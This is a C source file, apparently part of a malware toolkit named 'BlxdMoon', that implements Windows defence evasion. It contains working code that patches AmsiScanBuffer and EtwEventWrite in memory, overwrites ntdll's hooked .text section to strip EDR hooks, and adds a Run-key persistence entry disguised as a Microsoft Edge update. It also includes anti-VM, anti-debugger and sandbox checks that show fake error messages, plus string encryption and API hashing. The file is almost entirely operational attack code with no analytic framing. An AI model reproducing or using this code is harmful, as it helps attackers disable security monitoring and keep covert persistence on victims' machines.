/**
 * evasion.c - Evasion Techniques Implementation for BlxdMoon
 *
 * Implements:
 *   - AMSI bypass (T1562.001)
 *   - ETW patching (T1562.006)
 *   - ntdll unhooking (T1562.001)
 *   - Stealthy persistence
 *   - Master initialization
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "evasion.h"

// Global syscall table
SYSCALL_TABLE g_SyscallTable = {0};

// ============================================================
// AMSI Bypass
// ============================================================

// Patch bytes for x64: mov eax, 0x80070057 (E_INVALIDARG); ret
static BYTE AmsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

BOOL PatchAmsi(void) {
#if !EVASION_PATCH_AMSI
    return TRUE;
#endif

    // Decrypt amsi.dll string
    DECRYPT_STRING(amsiDll, ENC_AMSI_DLL, ENC_AMSI_DLL_LEN);

    // Load amsi.dll (may already be loaded)
    HMODULE hAmsi = LoadLibraryA(amsiDll);
    SECURE_CLEAR(amsiDll, ENC_AMSI_DLL_LEN);

    if (!hAmsi) {
        // AMSI not loaded = nothing to patch = success
        return TRUE;
    }

    // Decrypt function name
    DECRYPT_STRING(funcName, ENC_AMSISCANBUFFER, ENC_AMSISCANBUFFER_LEN);

    // Get AmsiScanBuffer address
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, funcName);
    SECURE_CLEAR(funcName, ENC_AMSISCANBUFFER_LEN);

    if (!pAmsiScanBuffer) {
        return FALSE;
    }

    // Change memory protection
    DWORD oldProtect;
    if (!VirtualProtect(pAmsiScanBuffer, sizeof(AmsiPatch),
                        PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }

    // Apply patch
    memcpy(pAmsiScanBuffer, AmsiPatch, sizeof(AmsiPatch));

    // Restore protection
    VirtualProtect(pAmsiScanBuffer, sizeof(AmsiPatch), oldProtect, &oldProtect);

    return TRUE;
}

// ============================================================
// ETW Patching
// ============================================================

// Patch bytes for x64: xor rax, rax; ret (return STATUS_SUCCESS)
static BYTE EtwPatch[] = { 0x48, 0x33, 0xC0, 0xC3 };

BOOL PatchEtw(void) {
#if !EVASION_PATCH_ETW
    return TRUE;
#endif

    // Decrypt ntdll.dll string
    DECRYPT_STRING(ntdllStr, ENC_NTDLL, ENC_NTDLL_LEN);

    HMODULE hNtdll = GetModuleHandleA(ntdllStr);
    SECURE_CLEAR(ntdllStr, ENC_NTDLL_LEN);

    if (!hNtdll) return FALSE;

    // Decrypt function name
    DECRYPT_STRING(funcName, ENC_ETWEVENTWRITE, ENC_ETWEVENTWRITE_LEN);

    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, funcName);
    SECURE_CLEAR(funcName, ENC_ETWEVENTWRITE_LEN);

    if (!pEtwEventWrite) return FALSE;

    // Change memory protection
    DWORD oldProtect;
    if (!VirtualProtect(pEtwEventWrite, sizeof(EtwPatch),
                        PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }

    // Apply patch
    memcpy(pEtwEventWrite, EtwPatch, sizeof(EtwPatch));

    // Restore protection
    VirtualProtect(pEtwEventWrite, sizeof(EtwPatch), oldProtect, &oldProtect);

    return TRUE;
}

// ============================================================
// ntdll.dll Unhooking
// ============================================================

BOOL UnhookNtdll(void) {
#if !EVASION_UNHOOK_NTDLL
    return TRUE;
#endif

    // Decrypt ntdll path
    DECRYPT_STRING(ntdllPath, ENC_NTDLL_PATH, ENC_NTDLL_PATH_LEN);

    // Open ntdll.dll from disk
    HANDLE hFile = CreateFileA(
        ntdllPath,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    SECURE_CLEAR(ntdllPath, ENC_NTDLL_PATH_LEN);

    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    // Create file mapping
    HANDLE hMapping = CreateFileMappingA(
        hFile,
        NULL,
        PAGE_READONLY | SEC_IMAGE,
        0,
        0,
        NULL
    );

    if (!hMapping) {
        CloseHandle(hFile);
        return FALSE;
    }

    // Map view of file
    LPVOID pCleanNtdll = MapViewOfFile(
        hMapping,
        FILE_MAP_READ,
        0,
        0,
        0
    );

    if (!pCleanNtdll) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return FALSE;
    }

    // Get loaded ntdll base
    DECRYPT_STRING(ntdllStr, ENC_NTDLL, ENC_NTDLL_LEN);
    HMODULE hNtdll = GetModuleHandleA(ntdllStr);
    SECURE_CLEAR(ntdllStr, ENC_NTDLL_LEN);

    if (!hNtdll) {
        UnmapViewOfFile(pCleanNtdll);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return FALSE;
    }

    // Parse PE headers
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(
        (BYTE*)hNtdll + pDosHeader->e_lfanew
    );

    // Find .text section and restore it
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);

    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (memcmp(pSection[i].Name, ".text", 5) == 0) {
            LPVOID pHookedText = (LPVOID)(
                (BYTE*)hNtdll + pSection[i].VirtualAddress
            );
            LPVOID pCleanText = (LPVOID)(
                (BYTE*)pCleanNtdll + pSection[i].VirtualAddress
            );
            SIZE_T textSize = pSection[i].Misc.VirtualSize;

            // Make .text writable
            DWORD oldProtect;
            if (!VirtualProtect(pHookedText, textSize,
                               PAGE_EXECUTE_READWRITE, &oldProtect)) {
                break;
            }

            // Copy clean .text over hooked .text
            memcpy(pHookedText, pCleanText, textSize);

            // Restore protection
            VirtualProtect(pHookedText, textSize, oldProtect, &oldProtect);

            break;
        }
    }

    // Cleanup
    UnmapViewOfFile(pCleanNtdll);
    CloseHandle(hMapping);
    CloseHandle(hFile);

    return TRUE;
}

// ============================================================
// Stealthy Persistence
// ============================================================

char* GetStealthyKeyName(void) {
    static char keyName[64];

    // Get computer name
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);

    // Generate DJB2 hash
    DWORD hash = 5381;
    for (char *p = computerName; *p; p++) {
        hash = ((hash << 5) + hash) + *p;
    }

    // Create innocent-looking key name
    sprintf(keyName, "MicrosoftEdgeUpdate%08X", hash);

    return keyName;
}

BOOL StealthyPersist(void) {
    // Decrypt registry path
    DECRYPT_STRING(regPath, ENC_REG_RUN_KEY, ENC_REG_RUN_KEY_LEN);

    // Get stealthy key name
    char *keyName = GetStealthyKeyName();

    // Get executable path
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    // Use dynamically resolved APIs
    HMODULE hAdvapi32 = GetModuleByHash(HASH_ADVAPI32_DLL);
    if (!hAdvapi32) {
        // Try loading it
        DECRYPT_STRING(advapi32Str, ENC_ADVAPI32, ENC_ADVAPI32_LEN);
        hAdvapi32 = LoadLibraryA(advapi32Str);
        SECURE_CLEAR(advapi32Str, ENC_ADVAPI32_LEN);
    }

    if (!hAdvapi32) {
        SECURE_CLEAR(regPath, ENC_REG_RUN_KEY_LEN);
        return FALSE;
    }

    fn_RegOpenKeyExA pRegOpenKeyExA = (fn_RegOpenKeyExA)
        GetFunctionByHash(hAdvapi32, HASH_REGOPENKEYEXA);
    fn_RegSetValueExA pRegSetValueExA = (fn_RegSetValueExA)
        GetFunctionByHash(hAdvapi32, HASH_REGSETVALUEEXA);
    fn_RegCloseKey pRegCloseKey = (fn_RegCloseKey)
        GetFunctionByHash(hAdvapi32, HASH_REGCLOSEKEY);

    if (!pRegOpenKeyExA || !pRegSetValueExA || !pRegCloseKey) {
        SECURE_CLEAR(regPath, ENC_REG_RUN_KEY_LEN);
        return FALSE;
    }

    HKEY hKey;
    BOOL success = FALSE;

    if (pRegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0,
                       KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        if (pRegSetValueExA(hKey, keyName, 0, REG_SZ,
                           (BYTE*)exePath, (DWORD)strlen(exePath) + 1) == ERROR_SUCCESS) {
            success = TRUE;
        }
        pRegCloseKey(hKey);
    }

    SECURE_CLEAR(regPath, ENC_REG_RUN_KEY_LEN);
    return success;
}

// ============================================================
// Master Initialization
// ============================================================

BOOL InitEvasion(void) {
    // Step 1: Anti-analysis checks

#if EVASION_CHECK_VM
    if (IsVirtualMachine()) {
#if EVASION_SHOW_FAKE_ERROR
        MessageBoxA(NULL,
            "This application requires Windows 10 version 1903 or later.",
            "Compatibility Error",
            MB_OK | MB_ICONERROR);
#endif
#if EVASION_SLEEP_AND_EXIT
        Sleep(30000);  // Sleep 30 seconds
#endif
        return FALSE;
    }
#endif

#if EVASION_CHECK_DEBUGGER
    if (IsDebuggerPresent_Advanced()) {
#if EVASION_SHOW_FAKE_ERROR
        MessageBoxA(NULL,
            "Application initialization failed. Error code: 0xC0000135",
            "Runtime Error",
            MB_OK | MB_ICONERROR);
#endif
        return FALSE;
    }
#endif

#if EVASION_CHECK_SANDBOX
    if (IsSandbox()) {
#if EVASION_SHOW_FAKE_ERROR
        MessageBoxA(NULL,
            "Required .NET Framework version not found.",
            "Missing Component",
            MB_OK | MB_ICONERROR);
#endif
        return FALSE;
    }
#endif

    // Step 2: Disable security telemetry
    PatchAmsi();
    PatchEtw();

    // Step 3: Remove EDR hooks
    UnhookNtdll();

    // Step 4: Initialize syscall table for future use
    InitSyscallTable();

    return TRUE;
}
